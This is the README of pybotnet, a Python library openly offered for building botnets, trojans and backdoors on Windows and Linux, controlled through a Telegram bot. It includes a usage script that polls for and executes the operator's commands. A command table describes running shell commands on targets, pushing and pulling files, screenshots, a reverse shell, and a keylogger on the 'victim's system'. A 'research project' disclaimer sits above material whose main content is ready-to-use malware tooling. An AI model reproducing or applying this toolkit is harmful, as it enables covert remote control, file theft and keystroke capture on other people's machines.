 
 <p align="center">
  <a href='https://github.com/onionj/pybotnet' target='_blank'><img src='https://files.virgool.io/upload/users/271869/posts/wxs2bk9hkqfx/ezoxwssoikqm.jpeg' border='5' alt='trojan horse'/></a>  <h1 align="center">pybotnet</h1>
  <p align="center"> A Python Library for building <b>botnet</b> , <b>trojan</b>  or <b>backdoor</b> for windows and linux with Telegram control panel </p>

  <p align="center">
    <a href="https://github.com/onionj/pybotnet">
      <img src="https://img.shields.io/pypi/v/pybotnet?label=pybotnet" />
    </a>
    <a href="https://github.com/onionj/pybotnet/blob/master/LICENSE">
      <img src="https://img.shields.io/github/license/onionj/pybotnet" />
    </a>
    <a href="https://www.python.org/">
    	<img src="https://img.shields.io/pypi/pyversions/pybotnet" />
    </a>
  </p>
</p>
 
> Disclaimer: Please note that this is a research project. I am by no means responsible for any usage of this tool. Use it on your behalf. 


> [Persian document](https://vrgl.ir/G2i6b)  داکیومنت فارسی


### Features:
* Telegram anti-filter control panel
* get command from telegram and execute scripts 
* get command and send message by third party proxy
* reverse shell
* keylogger
* get target info 
* sleep source by Optional message
* export file to targets system
* import file from target system 
* get screenshot
* Task Scheduler
* Open Website
* Play Sound

for more, see commands table end of this page 



#### Requirements:

* Python 3.6 or higher
* Telegram account

### Usage:
```
pip install pybotnet
```

```python

from pybotnet import pybotnet
import time

# change TELEGRAM_TOKEN and  ADMIN_CHAT_ID to valid data:

# telegram api token (Get it from the telegram @botfather)
TELEGRAM_TOKEN = '1468299547:ABHs_________MzZcYxF_e00000000000'

# telegram account number ID (get it from @userinfobot)
ADMIN_CHAT_ID = '12345678910'



# * is_sheel:          if you compile code without shell: is_sheel=False
# * show_log:          just for debugging
# * send_system_data:  send system short info in every bot messages in telegram

bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
                        show_log=True, send_system_data=True, is_shell=True)

delay = 10

while True:
    print('*-*'*15)
    bot.get_and_execute_scripts_by_third_party_proxy()
    time.sleep(delay)

```

### Commmands:

> Send this COMMANDs to your api bot in telegram, using the admin account.

>  for run command on one target:  `<Target_MAC_Address> <command>`   `66619484755211 get_info` 


COMMAND | Sample | DO THIS | version | tested on |
--------|--------|---------|--------------------------|-----------|
`get_info` | `get_info` |return system info | 0.06 | windows, linux |
`do_sleep <scconds> <message (Optional)>` | `do_sleep 99999 hi, i see you!` | \<if message != none : print(message) > ; time.sleep(seccond) | 0.08 | windows, linux |
`cmd <system command>` | `cmd mkdir new_folder` `cmd cd ..`, `cmd ls` | run system command in shell or cmd (Be careful not to give endless commands like `ping google.com -t`  in windows or `ping google.com` in linux)  TODO:add timeout| 0.07 | windows, linux|
`export_file <link>` | `export_file https://github.com/onionj/pybotnet/archive/refs/heads/master.zip` | target donwload this file and save to script path | 0.14 | windows, linux|
`import_file <file_route>` |`import_file /home/onionj/folder/somting.png` | get a file from target system (limit:5GB & 20min)| 0.17.0 |  windows, linux|
`screenshot` | `screenshot` | Takes a screenshot, uploads it to the online server and return the download link | 0.18.1 |  windows, linux |
`help` | `help` | send commands help | 0.18.5 | windows, linux |
`/start` | `/start` | run `help` command !! | 0.18.7 | windows, linux |
`<Target_MAC_Address> reverse_shell`| `66619484755211 reverse_shell` and `exit` for exit!| start reverse shell on target system | 0.20.1 | windows, linux |
`keylogger` | `keylogger start` and `keylogger stop` to stop the keylogger | Starts a keylogger on victim's system. *keylogger can't handle persian words very correctly* | 0.21.1 | windows, linux 
`scheduler` | `scheduler start ,stop , list` | Adds a schedule | 0.25.3 | windows, linux
`playsound` | `playsound <sound-name>` | Will play a sound . Playsound can only play MP3 or WAV Files. | 0.25.3 | windows, linux
`openurl` | `openurl <url> <how-many-times>` | Will open a url n times. | 0.25.3 | windows, linux

> If you like this repo and find it useful, please consider ★ starring it (on top right of the page) and forking it :)

> [TODO List](https://github.com/onionj/pybotnet/blob/master/TODOLIST.MD)

> Sample GUI Trojan created by pybotnet: [VINET](https://github.com/onionj/vinet)


## Contributors ✨
Thanks goes to these wonderful people

<table>
<td align="center"><a href="https://github.com/onionj"><img src="https://avatars.githubusercontent.com/u/77416478?v=4" width="70px;" alt=""/><br /><sub><b>oNion</b></sub></a><br /></td>
<td align="center"><a href="https://github.com/TorhamDev"><img src="https://avatars.githubusercontent.com/u/87639984?v=4" width="70px;" alt=""/><br /><sub><b> TorhamDev</b></sub></a><br /></td>
<td align="center"><a href="https://github.com/SepehrRasouli"><img src="https://avatars.githubusercontent.com/u/81516241?v=4" width="70px;" alt=""/><br /><sub><b> SepehrRasouli</b></sub></a><br /></td>
</table>
